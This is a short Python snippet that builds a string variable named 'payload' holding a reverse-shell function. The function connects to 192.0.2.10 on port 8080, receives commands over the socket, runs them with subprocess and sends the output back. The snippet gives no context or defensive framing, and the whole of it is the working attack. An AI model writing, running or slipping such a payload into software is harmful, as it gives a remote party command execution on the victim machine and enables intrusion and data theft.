import textwrap

payload = textwrap.dedent("""
def rev_shell():
    import socket, subprocess
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.0.2.10", 8080))
    while True:
        cmd = s.recv(1024).decode()
        out = subprocess.getoutput(cmd)
        s.sendall(out.encode())
""").strip()
